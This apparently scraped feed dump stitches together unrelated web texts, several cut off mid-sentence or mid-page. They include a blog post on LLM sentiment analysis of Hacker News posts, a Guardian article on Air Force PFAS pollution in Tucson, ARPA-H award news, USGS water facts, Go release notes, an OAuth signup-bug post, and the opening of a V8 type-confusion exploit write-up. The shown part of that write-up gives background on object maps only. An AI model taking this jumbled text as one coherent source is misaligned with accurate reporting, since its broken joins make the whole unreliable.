generated some discussion. Using <a href="https://huggingface.co/datasets/julien040/hacker-news-posts" target="_blank" rel="noopener noreferrer">a publicly
available dataset of HN posts</a>
(<a href="https://julienc.me/" target="_blank" rel="noopener noreferrer">thanks Julien!</a>), we queried all posts between
January 2020 and June 2023 (the latest date available in this dataset) which had at
least 20 upvotes and more than five comments, which resulted in about 100,000 posts.
<a href="https://github.com/outerbounds/hacker-news-sentiment/blob/main/hninit.py" target="_blank" rel="noopener noreferrer">Here's the simple Metaflow flow</a>
that did the job, much thanks to DuckDB.</p><p>Since the 100,000 posts are mostly on different domains, we can safely download
them in parallel without DDOS'ing the servers. It took only around 25 minutes to
download the pages with 100 parallel workers
(<a href="https://github.com/outerbounds/hacker-news-sentiment/blob/main/hncrawl.py" target="_blank" rel="noopener noreferrer">see here how</a>).</p><h3 id="large-scale-document-understanding-with-llms">Large-scale document understanding with LLMs<a href="#large-scale-document-understanding-with-llms" aria-label="Direct link to Large-scale document understanding with LLMs" title="Direct link to Large-scale document understanding with LLMs">​</a></h3><p>Parsing the text content from random HTML pages used to be a massive PITA, but
<a href="https://beautiful-soup-4.readthedocs.io/en/latest/" target="_blank" rel="noopener noreferrer">BeautifulSoup</a> makes it <a href="https://github.com/outerbounds/hacker-news-sentiment/blob/main/hnposts.py#L94" target="_blank" rel="noopener noreferrer">beautifully
straightforward</a>.</p><p>At this point, we have a relatively clean dataset of about 100,000 text documents with
more than 500M tokens in total. Processing the dataset once with a state-of-the-art LLM,
say, GPT-4o, or Llama3 70b on AWS Bedrock would cost around $1,300 (using ChatGPT batch API),
not counting the output tokens. Besides the cost, time is a concern - we want to process
the dataset as fast as possible, so we can evaluate the results quickly, and rinse-and-repeat
if needed. Hence we don't want to get rate-limited or otherwise bottlenecked by the APIs.</p><p>We have <a href="https://outerbounds.com/blog/document-understanding/" target="_blank" rel="noopener noreferrer">posted previously</a> about our
success with <a href="https://outerbounds.com/blog/nim-announcement/" target="_blank" rel="noopener noreferrer">NVIDIA NIM microservices</a> that
provide a quickly growing library of LLMs and other GenAI models as prepackaged images,
fully optimized to take advantage of vLLM, TensorRT-LLM and the Triton Inference Server,
so you don't have to spend time <a href="https://outerbounds.com/blog/the-many-ways-to-deploy-a-model/#measuring-performance" target="_blank" rel="noopener noreferrer">chasing the latest tricks with LLM
inference</a>.</p><p>Since we had NIMs included in <a href="https://outerbounds.com/platform" target="_blank" rel="noopener noreferrer">our Outerbounds deployment</a>,
we just <a href="https://github.com/outerbounds/hacker-news-sentiment/blob/main/hnposts.py#L40" target="_blank" rel="noopener noreferrer">added <code>@nim</code> to our flow</a>
to get  access to a high-throughput LLM endpoint that costs only as much as the auto-scaling GPUs
it runs on, in this case, four H100 GPUs. Naturally you can hit an LLM endpoint of your
choosing - the options are many these days.</p><h3 id="prompting-an-llm-to-produce-a-list-of-topics-for-each-post">Prompting an LLM to produce a list of topics for each post<a href="#prompting-an-llm-to-produce-a-list-of-topics-for-each-post" aria-label="Direct link to Prompting an LLM to produce a list of topics for each post" title="Direct link to Prompting an LLM to produce a list of topics for each post">​</a></h3><p>Our prompt is straightforward:</p><div open=""><pre tabindex="0"><code><span><span>Assign 10 tags that best describe the following article.</span><br></span><span><span>Reply only the tags in the following format:</span><br></span><span><span>1. first tag</span><br></span><span><span>2. second tag</span><br></span><span><span>N.

limit the number of tokens to 5,000 to account for differences in the tokenizer behavior,
making sure that we don't go past the limit. </p><p>Processing about 140M inputs tokens in this manner took about 9 hours. We were able to
increase throughput to around 4,300 input tokens per second by hitting the model concurrently
with five workers, as neatly shown in our UI below, to take advantage of dynamic batching
and other optimizations.</p><p><img loading="lazy" src="https://outerbounds.com/assets/images/sentiment-mfgui-582a32fc57b12b9a0835e61997598237.png" width="1869" height="950"></p><p>Instead of trying to download 100,000 comment pages directly from Hacker News, we
leveraged <a href="https://console.cloud.google.com/marketplace/product/y-combinator/hacker-news" target="_blank" rel="noopener noreferrer">a Hacker News dataset in Google
BigQuery</a>.
Annoyingly, comments in the database are not directly associated with their parent
post, so we had to implement <a href="https://github.com/outerbounds/hacker-news-sentiment/blob/main/hncomments.py#L152" target="_blank" rel="noopener noreferrer">a small function to reconstruct the comment
threads</a>.</p><p>We can't run the function with BigQuery directly but luckily we can export the data easily
in Parquet files. Loading the resulting 16M rows in DuckDB and scanning through them
was a breeze, aided by the fact that Metaflow knows how to <a href="https://outerbounds.com/blog/metaflow-fast-data/" target="_blank" rel="noopener noreferrer">load data
fast</a>. We just
added <code>@resources(disk=10000, cpu=8, memory=32000)</code>  to run the function on a large enough instance.</p><h3 id="prompting-an-llm-to-analyze-sentiment">Prompting an LLM to analyze sentiment<a href="#prompting-an-llm-to-analyze-sentiment" aria-label="Direct link to Prompting an LLM to analyze sentiment" title="Direct link to Prompting an LLM to analyze sentiment">​</a></h3><p>With the comment threads at hand, we were able to <a href="https://github.com/outerbounds/hacker-news-sentiment/blob/main/hnsentiment.py" target="_blank" rel="noopener noreferrer">run them through our
LLM</a> with this prompt:</p><div open=""><pre tabindex="0"><code><span><span>In the scale between 0-10 where 0 is the most negative sentiment</span><br></span><span><span>and 10 is the most positive sentiment, rank the following discussion.</span><br></span><span><span>Reply in this format:</span><br></span><span><span></span><br></span><span><span>SENTIMENT X</span><br></span><span><span></span><br></span><span><span>where X is the sentiment rating</span><br></span><span><span>---</span><br></span><span><span>[First 3000 tokens from a comment thread]</span><br></span></code></pre></div><p>Getting a simple structured output like this seems to work without issues. We processed
through some 230M input tokens in this manner, which took only about 7 hours as we
needed only two output tokens.</p><p>You can reproduce all the steps above using your favorite toolchain. Here are
key reasons why we used Metaflow and why you might want to consider it too:</p><ul><li><p><strong>Staying organized without effort</strong> - a big benefit compared to random Python
scripts or notebooks is that Metaflow persists all artifacts automatically, tracks all
executions, and keeps everything organized. We relied on <a href="https://docs.metaflow.org/scaling/tagging" target="_blank" rel="noopener noreferrer">Metaflow's
namespaces</a> to execute large and expensive
runs alongside prototypes, knowing that the two can't interfere with each other. We
used <a href="https://outerbounds.com/blog/five-ways-to-use-the-new-metaflow-tags/" target="_blank" rel="noopener noreferrer">Metaflow tags</a>
to organize data sharing between flows while they were being developed independently.</p></li><li><p><strong>Easy cloud scaling</strong> - crawling required <a href="https://docs.metaflow.org/scaling/remote-tasks/introduction#running-many-tasks-in-parallel-with-foreach" target="_blank" rel="noopener noreferrer">horizontal
scaling</a>,
DuckDB required <a href="https://docs.metaflow.org/scaling/remote-tasks/introduction#requesting-compute-resources" target="_blank" rel="noopener noreferrer">vertical scaling</a>,
and LLMs required <a href="https://docs.metaflow.org/scaling/remote-tasks/gpu-compute" target="_blank" rel="noopener noreferrer">a GPU backend</a>.
Metaflow handled all the cases out of the box.</p></li><li><p><strong>Highly available orchestrator</strong> - running a large dataset through an LLM can cost
thousands of dollars. You don't want the run to fail because of random issues.
We relied on <a href="https://docs.metaflow.org/production/introduction" target="_blank" rel="noopener noreferrer">a highly available Argo Workflows
orchestrator</a> that Metaflow
supports out of the box to keep the run running for hours.</p></li></ul><p>You can do all of the above using <a href="https://metaflow.org/" target="_blank" rel="noopener noreferrer">open-source Metaflow</a>, but we had a few
additional benefits by running the flows on <a href="https://outerbounds.com/platform" target="_blank" rel="noopener noreferrer">Outerbounds Platform</a>:
It is simply fun to develop code like this, including notebooks, with VSCode running on
<a href="https://outerbounds.com/features/cloud-workstations/" target="_blank" rel="noopener noreferrer">cloud workstations</a>,
<a href="https://outerbounds.com/features/compute-at-scale/" target="_blank" rel="noopener noreferrer">scaling to the cloud</a> is smooth sailing,
and <a href="https://outerbounds.com/blog/nim-announcement/" target="_blank" rel="noopener noreferrer"><code>@nim</code></a> allowed us to hit LLMs without
worrying about cost or rate limiting.</p><p>If features like this sound relevant to your interests, we are happy
to <a href="https://outerbounds.com/get-started/" target="_blank" rel="noopener noreferrer">get you started for free</a>.</p><h2 id="dive-deeper-at-home">Dive deeper at home<a href="#dive-deeper-at-home" aria-label="Direct link to Dive deeper at home" title="Direct link to Dive deeper at home">​</a></h2><p>There's much more that can be analyzed and visualized with this dataset. Instead of spending
a few thousand dollars hitting OpenAI APIs, you can
<a href="https://github.com/outerbounds/hacker-news-sentiment/tree/main/data" target="_blank" rel="noopener noreferrer">download the topics and sentiments we created</a>:</p><ul><li><p><code>post-sentiment.json</code> contains a mapping <code>post_id -&gt; sentiment_score</code></p></li><li><p><code>post-topics.json</code> contains a mapping <code>post_id -&gt; [topics]</code></p></li><li><p><code>topics-data.json</code> contains a cleaned and joined dataset based on the above JSONs,
powering the tool at the top of this article.</p></li></ul><p>You can find metadata related to post IDs in <a href="https://huggingface.co/datasets/julien040/hacker-news-posts" target="_blank" rel="noopener noreferrer">this HuggingFace
dataset</a> and in the
<a href="https://console.cloud.google.com/marketplace/product/y-combinator/hacker-news" target="_blank" rel="noopener noreferrer">Google BigQuery Hacker News

sentiments and topics. Our hunch is that certain domains produce predominantly positive
sentiments and vice versa. Or, do divisive topics garner more points?</p><p>If you create something fun with this data, please link back to this blog article and let us

The business owner was seeking Marion city council approval for a liquor license and the record showed that she potentially had driven without a valid license for years. However, she later had her license reinstated.</p><p>The prosecutors’ report concluded that no crime was committed by Meyer, Zorn or the newspaper and that Cody reached an erroneous conclusion about their conduct because of a poor investigation. Zorn used the information she had to legally search an online state database using her own name.</p></div></div>]]></description>

<div id="readability-page-1" class="page"><div id="maincontent"><p>The US air force is refusing to comply with an order to clean drinking water it polluted in Tucson, <a href="https://www.theguardian.com/us-news/arizona" data-link-name="in body link">Arizona</a>, claiming federal regulators lack authority after the conservative-dominated <a href="https://www.theguardian.com/us-news/us-supreme-court" data-link-name="in body link">US supreme court</a> overturned the “Chevron doctrine”. Air force bases contaminated the water with toxic <a href="https://www.theguardian.com/environment/pfas" data-link-name="in body link">PFAS “forever chemicals”</a> and other dangerous compounds.</p><p>Though former US <a href="https://www.theguardian.com/environment/epa" data-link-name="in body link">Environmental Protection Agency</a> (EPA) officials and legal experts who reviewed the air force’s claim say the Chevron doctrine ruling probably would not apply to the order, the <a href="https://www.theguardian.com/us-news/us-military" data-link-name="in body link">military’s</a> claim that it would represents an early indication of how polluters will wield the controversial court decision to evade responsibility.</p><p>It appears the air force is essentially attempting to expand the scope of the court’s ruling to thwart regulatory orders not covered by the decision, said Deborah Ann Sivas, director of the Stanford University Environmental Law Clinic.</p><p>“It’s very odd,” she added. “It feels almost like an intimidation tactic, but it will be interesting to see if others take this approach and it bleeds over.”</p><p>The supreme court in late June <a href="https://www.theguardian.com/us-news/ng-interactive/2024/jun/28/us-supreme-court-chevron-doctrine-ruling" data-link-name="in body link">overturned the 40-year-old Chevron doctrine</a>, one of its most important precedents. The decision sharply cut regulators’ power by giving judges the final say in interpreting ambiguous areas of the law during rule-making. Judges previously gave deference to regulatory agency experts on such questions.</p><p>The ruling is expected to have a profound impact on the EPA’s ability to protect the public from pollution, and the Tucson dispute highlights the high stakes in such scenarios – clean drinking water and the health of hundreds of thousands of people hangs in the balance.</p><p>Several air force bases are largely responsible for trichloroethylene (TCE) – volatile organic compounds – and <a href="https://www.theguardian.com/environment/pfas" data-link-name="in body link" data-component="auto-linked-tag">PFAS</a> contaminating drinking water sources in Tucson. A 10-sq-mile (26 sq km) area around the facilities and Tucson international airport were in the 1980s designated as a Superfund site, an action reserved for the nation’s most polluted areas.</p><p>The EPA in late May <a href="https://www.epa.gov/az/tiaa-tarp" data-link-name="in body link">issued an emergency order</a> under the Safe Drinking Water Act requiring the air force to develop a plan within 60 days to address PFAS contamination in the drinking water.</p><p>Filtration systems put in place in 2014 for TCE and other chemicals are currently removing PFAS, but the systems were not designed to remove PFAS, and the added burden is straining the system.</p><p>Officials previously shut down a well in 2021 when contaminated water nearly broke through the system, the EPA wrote. Such a breach could leave the <a href="https://www.theguardian.com/us-news/arizona" data-link-name="in body link" data-component="auto-linked-tag">Arizona</a> city without safe water.</p><p>The EPA order requires the development of a system specifically designed for PFAS. A similar system is estimated to cost about $25m to develop, or about 0.1% of the air force’s annual budget.</p><p>In a formal response sent to the EPA in the weeks after the supreme court reversed Chevron, the air force claimed the EPA lacked the authority to make the order, citing the case as evidence and stating “the EPA’s order can not withstand review”.</p><p>But legal experts noted that Chevron does not affect EPA enforcement actions like the Tucson order – it only affects the rule-making process.</p><p>Moreover, one arm of the administration cannot sue another, so the military cannot sue the EPA, and the case would never end up in court where the Chevron decision would come into play, said Walter Mugdan, a former EPA Superfund director. Instead, it would be resolved internally by a presidential administration instead of the judiciary.</p><p>However, a business that finds itself in a similar position may try to sue the EPA, Sivas said.</p><p>The air force did not respond to specific questions about its Chevron claim, but said it “will continue to meet our obligations under the federal [Superfund] law”.</p><p>The crux of the rest of the air force’s refusal to comply with the order hangs on whether there is “imminent and substantial danger” to Tucson residents. The air force noted Tucson’s drinking water was currently below the federal limit for PFAS.</p><p>But the EPA noted the filtration system was straining because it was not designed for PFAS, and the plume was especially dangerous because there are limited alternative drinking water sources in the desert. The real possibility that the system breaks and leaves people exposed or without clean water constitutes “imminent and substantial” danger, the EPA wrote in its response.</p><p>“The law does not require or expect EPA to wait until people are actively being harmed,” the EPA added. “In fact, Congress expects EPA to utilize its authority to prevent the harm from materializing.”</p><p>The air force also claimed it should not be forced to address the problem because the city of Tucson and state of Arizona are funding a different system to address PFAS. In response, the EPA said the new system would not be ready for years, and the air force is financially responsible for the pollution.</p><p>“The Air Force bears responsibility for the PFAS contamination and needs to step forward to protect the Tucson community,” the EPA wrote.</p></div></div>]]></description>

<h2>About this Book</h2>
<p>The Rust programming language is extremely well suited for concurrency, and its ecosystem has many libraries that include lots of concurrent data structures, locks, and more. But implementing those structures correctly can be difficult. Even in the most well-used libraries, memory ordering bugs are not uncommon.</p>
<p>In this practical book, Mara Bos, team lead of the Rust library team, helps Rust programmers of all levels gain a clear understanding of low-level concurrency. You’ll learn everything about atomics and memory ordering and how they're combined with basic operating system APIs to build common primitives like mutexes and condition variables. Once you’re done, you’ll have a firm grasp of how Rust’s memory model, the processor, and the role of the operating system all fit together.</p>
<p>With this guide, you’ll learn:</p>
<ul>
<li>How Rust's type system works exceptionally well for programming concurrency correctly</li>
<li>All about mutexes, condition variables, atomics, and memory ordering</li>
<li>What happens in practice with atomic operations on Intel and ARM processors</li>
<li>How locks are implemented with support from the operating system</li>
<li>How to write correct code that includes concurrency, atomics, and locks</li>
<li>How to build your own locking and synchronization primitives correctly</li>

        <h2>Biden-Harris Administration announces ARPA-H awards to develop novel technologies for precise tumor removal &nbsp;</h2><p><em>PSI performer teams aim to deliver groundbreaking tools enabling surgeons to successfully remove tumors through a single operation</em></p><p>The Advanced Research Projects Agency for Health (<a href="https://arpa-h.gov/">ARPA-H</a>), an agency within the U.S. Department of Health and Human Services (HHS), announced the first eight teams selected by its Precision Surgical Interventions (<a href="https://arpa-h.gov/research-and-funding/programs/psi">PSI</a>) program to receive awards. The agency’s commitment is not expected to exceed $150 million to develop novel technologies that will allow surgeons to remove cancerous tumors with higher accuracy. If successful, these technologies will revolutionize surgeries, dramatically reducing rates of repeat procedures. They can also reduce instances of unintentional injury to critical structures such as nerves, blood vessels or lymph ducts. These imaging tools may also be used to improve other types of surgeries.  &nbsp;</p><p>“From the start, ARPA-H has had a singular purpose: to drive breakthroughs in health, including cancer. Revolutionizing surgical techniques is a critical step forward towards improving detection and treatment of cancer, and improving the overall patient experience in the process,” said HHS Secretary Xavier Becerra. "The Biden-Harris Administration is committed to reducing the cancer death rate by at least 50 percent over the next 25 years. This goal is becoming more and more achievable thanks to breakthrough treatments and innovative technologies like these.” &nbsp;</p><p>“With the Precision Surgical Interventions program, we're seeking to fundamentally change how surgery is done. PSI and its technical performer teams are committed to developing tools that reduce the rate of reoperations or accidental damage to critical structures,” said <a href="https://arpa-h.gov/about/people/ileana-hancu/" target="_blank">Ileana Hancu, Ph.D.</a>, ARPA-H PSI Program Manager.  &nbsp;</p><p>ARPA-H selected these awardees to develop methods and techniques to improve cancer detection and increase the visibility of critical anatomical structures during surgery. PSI will pursue two technical areas: cancer localization (technical areas 1-A and 1-B) and healthy structure localization (technical area 2).  &nbsp;</p><p>Technical area 1-A performers will focus on visualizing the surface of excised tumors and identifying if there are any cancer cells left. If so, the surgeon will be able to remove more  tissue prior to completing the surgery. The performers will use different microscopy techniques to visualize the surface of the removed tissue with sub-cellular resolution. All images will be read and classified automatically, without the need to have pathologists in the operating room: &nbsp;</p><ul><li>Tulane University will build an imaging system that uses a large aperture camera and structured illumination microscopy, an imaging technique that uses patterned light to achieve high resolution in three dimensions. It takes advantage of light wave interference patterns to image entire excised tumors. The team will also develop an AI algorithm to automatically identify cancerous cells for fast data classification. Total award up to $22.9M.&nbsp;</li><li>Rice University will build a novel microscope that images tumor slices with ultraviolet epifluorescence. They will use advanced methods to create fluorescent stains that label cells and cellular components and will develop automated AI algorithms to transform their images into ones that look similar to conventional pathology. They will also develop an automated pathology algorithm to classify the imaged cells. Total award up to $18.0M.&nbsp;</li><li>University of Washington will develop a microscopy system to allow surgeons to image the entire surface of the tumor by placing it on a lightsheet scanner. The team is also developing algorithms to pseudo-stain the resulting images, so that the sample doesn’t need to be dyed in the operating room; instead, AI methods will take a greyscale image and render it similar to conventional pathology images in order to better classify it.  Total award up to $21.1M.&nbsp;</li></ul><p>Technical area 1-B performers will focus on identifying microscopic cancer remnants inside the patient to help the surgeon remove all remaining cancer cells before the end of the procedure: &nbsp;</p><ul><li>University of California, San Francisco is inventing a microscope that uses an optical array that is pressed into the cavity’s surface. Each pixel is its own multicolor microscope. The investigators are also developing a multi-cancer dyeing agent that activates based on enzyme activity in tumors. Total award up to $15.1M.&nbsp;</li><li>University of Illinois Urbana-Champaign will develop optical coherence tomography techniques to find suspicious tissue structures in the surgical cavity, then image those regions with nonlinear optics, which will give a multilayered view of the cells’ metabolism and structural properties. Total award up to $32.6M.&nbsp;</li><li>Johns Hopkins University, which is performing on both technical area 1-B and technical area two, will develop a novel non-contact, photoacoustic endoscope to provide a more colorful view of the surgical field without altering the surgeons’ workflow. They will also develop a multi-cancer fluorescent contrast agent.  Total award up to $20.9M.&nbsp;</li></ul><p>Technical area 2 performers will focus on making critical anatomy more visible to surgeons: &nbsp;</p><ul><li>Dartmouth College is creating a laparoscope-integrating imaging solution that will be especially helpful in prostate cancer surgeries. They will use nerve-dyeing and ureter-dyeing contrast agents, in addition to vascular dyes, to cause these critical anatomical structures to fluoresce. They will then map and visualize the 3D shape and depth of the structures.  Total award up to $31.3M.&nbsp;</li><li>Johns Hopkins University will use existing fluorescent dyes in combination with their novel photoacoustic endoscope to visualize anatomical structures for surgeons. The endoscope will ‘see’ deep into human tissue to reveal hidden blood vessels and nerves, such as they are not accidentally cut. (See above)&nbsp;</li><li>Cision Vision will use shortwave infrared and hyperspectral images to help surgeons visualize blood vessels, nerves, and especially lymphatic structures. Going well beyond red, green, and blue, hyperspectral imaging is enhanced by AI algorithms. This would allow the team to distinguish between tissue types without administering dyes.  Total award up to $22.3M.&nbsp;</li></ul><p>“With PSI, we aim to reduce surgical errors significantly and achieve better health outcomes across cancer and other diseases,” said <a href="http://arpa-h.gov/about/people/renee-wegrzyn">ARPA-H Director Renee Wegrzyn, Ph.D. </a>“Surgical procedures are often the first treatment option for some two million Americans diagnosed with cancer each year. This lack of precision can lead to repeat surgeries, harder recoveries, cancer recurrence, and higher health care costs. Our hope is to advance cancer surgery so that we remove cancer the first time and every time.” &nbsp;</p><p>The PSI program mandates that all performers design solutions that are compatible with all users. For example, if designing a tool for surgeons, the tool must fit different hand sizes. PSI mandates that all performers also be committed to equitable access and the development of medical devices that will be useable in virtually any hospital. As such, PSI performers must prioritize lower-cost solutions in their designs and test their devices in a rural hospital during the program. Furthermore, the devices must be validated in patient populations that reflect the demographics of the disease studied. &nbsp;</p><p>The performers’ awards are ceilings, based on each performer meeting its contractual milestones. ARPA-H’s total investment is not expected to exceed $150M.&nbsp;</p><p>For more on PSI, visit the <a href="https://arpa-h.gov/research-and-funding/programs/psi">PSI program page</a>.  &nbsp;</p>

    <h3>Detailed Description</h3>
    
<div><p>This image shows blue spheres representing relative amounts of Earth's water in comparison to the size of the Earth. Are you surprised that these water spheres look so small? They are only small in relation to the size of the Earth. These images attempt to show three dimensions, so each sphere represents "volume." They show that in comparison to the volume of the globe, the amount of water on the planet is very small. Oceans account for only a "thin film" of water on the surface.</p>
<p><strong>Spheres representing all of Earth's water, Earth's liquid fresh water, and water in lakes and riv</strong>ers</p>
<p>The largest sphere represents all of Earth's water. Its diameter is about 860 miles (the distance from Salt Lake City, Utah, to Topeka, Kansas) and has a volume of about 332,500,000 cubic miles (mi<sup>3</sup>) (1,386,000,000 cubic kilometers (km<sup>3</sup>)). This sphere includes all of the water in the oceans, ice caps, lakes, rivers, groundwater, atmospheric water, and even the water in you, your dog, and your tomato plant.</p>
<p><strong>Liquid fresh water</strong></p>
<p>How much of the total water is fresh water, which people and many other life forms need to survive? The blue sphere over Kentucky represents the world's liquid fresh water (groundwater, lakes, swamp water, and rivers). The volume comes to about 2,551,100 mi<sup>3</sup> (10,633,450 km<sup>3</sup>), of which 99 percent is groundwater, much of which is not accessible to humans. The diameter of this sphere is about 169.5 miles (272.8 kilometers).</p>
<p><strong>Water in lakes and rivers</strong></p>
<p>Do you notice the "tiny" bubble over Atlanta, Georgia? That one represents fresh water in all the lakes and rivers on the planet. Most of the water people and life of earth need every day comes from these surface-water sources. The volume of this sphere is about 22,339 mi<sup>3</sup> (93,113 km<sup>3</sup>). The diameter of this sphere is about 34.9 miles (56.2 kilometers). Yes, Lake Michigan looks way bigger than this sphere, but you have to try to imagine a bubble almost 35 miles high—whereas the average depth of Lake Michigan is less than 300 feet (91 meters).</p>

<p>This page summarizes the changes between official stable releases of Go.
The <a href="https://go.dev/change">change log</a> has the full details.</p>

<p>To update to a specific release, use:</p>

<pre>git fetch --tags
git checkout <i>goX.Y.Z</i>
</pre>

<h2 id="policy">Release Policy</h2>

<p>
Each major Go release is supported until there are two newer major releases.
For example, Go 1.5 was supported until the Go 1.7 release, and Go 1.6 was
supported until the Go 1.8 release.
We fix critical problems, including <a href="https://go.dev/security">critical security problems</a>,
in supported releases as needed by issuing minor revisions
(for example, Go 1.6.1, Go 1.6.2, and so on).

    <tr><td></td></tr><tr><td colspan="2"></td><td><div><p>TL;DR: The "Sign in with Google" form doesn't debounce clicks on the "Continue" button, so it can trigger multiple redirect callbacks, in our case causing 15% of signups to fail. We've since reproduced the issue with several other companies' signup flows.</p><p>What's the issue?</p><p>A few months ago we (Flat.app) noticed that a meaningful fraction of signups-via-Google to our SaaS product were failing. I recently found out why, so I'm sharing this PSA for anyone facing a similar problem.</p><p>If your app supports "Sign in with Google", it's likely that new signups will fail if, on Google's OAuth consent screen, a user clicks "Continue" more than once. The error will probably be inscrutable to the user, depending on your setup, so they may just give up instead of trying again. In our case, we were losing around 15% of signups!</p><p>I encountered this issue while investigating failed signups for our product, but I've also reproduced it with other popular products including ChatGPT, Doordash, Expedia, and Snyk, so I assume it's widespread.</p><p>Some of these products use Auth0, as do we, but others don't, and they still generate an error of one kind or another.</p><p>For Auth0 specifically, the error is "You may have pressed the back button, refreshed during login, opened too many login dialogs, or there is some issue with cookies, since we couldn't find your session. Try logging in again from the application and if the problem persists please contact the administrator." The error tries to be helpful by listing potential causes, but it fails to mention the actual cause. That's because Auth0 wasn't aware of this failure mode, based on my correspondence with them.</p><p>Why does this happen?</p><p>After a user clicks "Continue" the first time, Google will respond with a 302 to the callback URL, passing along the authorization code and replaying the OAuth 2.0 state param. If the user clicks "Continue" again, Google will respond again with a 302 to the callback URL. The browser will abort the first pending request and issue a new request to the callback URL. Importantly, the state param is, as it should be, the same in both requests, and it typically incorporates a nonce (see https://datatracker.ietf.org/doc/html/draft-ietf-oauth-security-topics#name-protecting-redirect-based-f). Since the nonce will already have been consumed by the first request, the second request will be rejected.</p><p>Why would a user click "Continue" twice?</p><p>Simple: poor UX in Google's consent screen. The "Continue" button provides almost no feedback that the click was registered, and the screen provides no feedback that any requests are pending. So, some users will naturally try again, especially if they're on a slow connection.</p><p>What can Google do?</p><p>Google could disable the "Continue" button with a loading indicator after the first click. That would ensure it's not possible to click it twice, and it would provide an improved UX by showing the user that something is happening.</p><p>Google's OAuth consent screen was redesigned at some point in the past few years. Allowing "Continue" to be clicked twice, with no visible feedback, may be an unintended regression.</p><p>What can I do?</p><p>Test this in your own application. Be sure to deauthorize your app before each test run so that you get the OAuth consent screen. You can do that in your Google account's Data &amp; privacy section.</p><p>Also, check your logs for errors to see if you're losing signups. See if you can detect this scenario and, if so, provide a better experience to users, e.g., by acknowledging what caused the error and giving them a clearer path to continue.</p></div></td></tr>        <tr><td></td></tr><tr><td colspan="2"></td><td><form action="comment" method="post"></form></td></tr>  </tbody></table>

            <description><![CDATA[<p>URL: <a href="https://github.blog/security/vulnerability-research/from-object-transition-to-rce-in-the-chrome-renderer/">https://github.blog/security/vulnerability-research/from-object-transition-to-rce-in-the-chrome-renderer/</a>, See on <a href="https://news.ycombinator.com/item?id=41236430">Hacker News</a></p>
<div id="readability-page-1" class="page"><section>
	
<p>In this post, I’ll exploit <a href="https://github.com/advisories/GHSA-fchp-8m28-g68f">CVE-2024-5830</a>, a type confusion bug in v8, the Javascript engine of Chrome that I reported in May 2024 as <a href="https://issues.chromium.org/issues/342456991">bug 342456991</a>. The bug was fixed in version <a href="https://chromereleases.googleblog.com/2024/06/stable-channel-update-for-desktop.html">126.0.6478.56/57</a>. This bug allows remote code execution (RCE) in the renderer sandbox of Chrome by a single visit to a malicious site.</p>
<h2 id="object-map-and-map-transitions-in-v8">Object map and map transitions in V8<a href="#object-map-and-map-transitions-in-v8" aria-label="Object map and map transitions in V8"></a></h2>
<p>This section contains some background materials in object maps and transitions that are needed to understand the vulnerability. Readers who are familiar with this can skip to the next section.</p>
<p>The concept of a map (or hidden class) is fairly fundamental to Javascript interpreters. It represents the memory layout of an object and is crucial in the optimization of property access. There are already many good articles that go into much more detail on this topic. I particularly recommend “<a href="https://mathiasbynens.be/notes/shapes-ics#object-model">JavaScript engine fundamentals: Shapes and Inline Caches</a>” by Mathias Bynens.</p>
<p>A map holds an array of property descriptors (<a href="https://v8.dev/blog/fast-properties#hiddenclasses-and-descriptorarrays"><code>DescriptorArrays</code></a>) that contains information about each property. It also holds details about the elements of the object and its <a href="https://v8.dev/blog/elements-kinds">type</a>.</p>
<p>Maps are shared between objects with the same property layout. For example, the following objects both have a single property <code>a</code> of type <code>SMI</code> (31 bit integers), so they can share the same map.</p>
<pre><code>
o1 = {a : 1};
o2 = {a : 10000};  //&lt;------ same map as o1, MapA
</code></pre>
<p>Maps also account property types in an object. For example, the following object, <code>o3</code> has a map different from <code>o1</code> and <code>o2</code>, because its property <code>a</code> is of type <code>double</code> (<code>HeapNumber</code>), rather than <code>SMI</code>:</p>
<pre><code>
o3 = {a : 1.1};
</code></pre>
<p>When a new property is added to an object, if a map does not already exist for the new object layout, a new map will be created.</p>
<pre><code>
o1.b = 1; //&lt;------ new map with SMI properties a and b
</code></pre>
<p>When this happens, the old and the new map are related by a transition:</p>

<p>Conversely, the map of <code>o2</code> (<code>0x3a5d00298911</code>) is stored in this new map as the back pointer. A map can store multiple transitions in a <code>TransitionArray</code>.

 ...
</map></map></map></code></pre>
<p>When a field of type <code>SMI</code> in an object is assigned a <code>double</code> (<code>HeapNumber</code>) value, because the <code>SMI</code> type cannot hold a <code>double</code> value, the map of the object needs to change to reflect this:</p>
<pre><code>
o1 = {a : 1};
o2 = {a : 1};
o1 = {a : 1.1};
%DebugPrint(o1);
DebugPrint: 0x1b4e00049015: [JS_OBJECT_TYPE]

 }
0x1b4e00298935: [Map] in OldSpace
 ...
 - deprecated_map
 ...
</map></map></code></pre>
<p>Note that, not only do <code>o1</code> and <code>o2</code> have different maps, but the map of <code>o2</code> is also marked as <code>deprecated</code>. This means that when a new object of the same property layout is created, it’ll use the map of <code>o1</code> (<code>0x1b4e002989a1</code>) instead of that of <code>o2</code> (<code>0x1b4e00298935</code>) because a more general map, the map of <code>o1</code>, whose field can represent both <code>HeapNumber</code> and <code>SMI</code>, is now available. Moreover, the map of <code>o2</code> will also be updated to the map of <code>o1</code> when its properties are accessed. This is done via the <a href="https://source.chromium.org/chromium/chromium/src/+/refs/tags/125.0.6422.112:v8/src/objects/map-updater.cc;l=272"><code>UpdateImpl</code></a> function:</p>
<pre><code>
Handle<map> MapUpdater::UpdateImpl() {
  ...
  if (FindRootMap() == kEnd) return result_map_;
  if (FindTargetMap() == kEnd) return result_map_;
  if (ConstructNewMap() == kAtIntegrityLevelSource) {
    ConstructNewMapWithIntegrityLevelTransition();
  }
  ...
  return result_map_;
}
</map></code></pre>
<p>Essentially, the function uses the <code>back pointer</code> of a <code>map</code> to retrace the transitions until it reaches the first map that does not have a back<code>pointer</code> (the <code>RootMap</code>). It then goes through the transitions from the <code>RootMap</code> to check if there already exists a suitable map in the transitions that can be used for the object (<code>FindTargetMap</code>). If a suitable map is found, then <code>ConstructNewMap</code> will create a new map which is then used by the object.</p>
<p>For example, in the following case, a map with three properties becomes deprecated when the second property is assigned a <code>HeapNumber</code> value:</p>
<pre><code>
obj = {a : 1};
obj.b = 1;
obj.c = 1; //&lt;---- Map now has 3 SMI properties
obj.b = 1.1 //&lt;----- original map becomes deprecated and a new map is created
</code></pre>
<p>In this case, two new maps are created. First a map with properties <code>a</code> and <code>b</code> of types <code>SMI</code> and <code>HeapNumber</code> respectively, then another map with three properties, <code>a : SMI</code>, <code>b : HeapNumber</code> and <code>c : SMI</code> to accommodate the new property layout:</p>
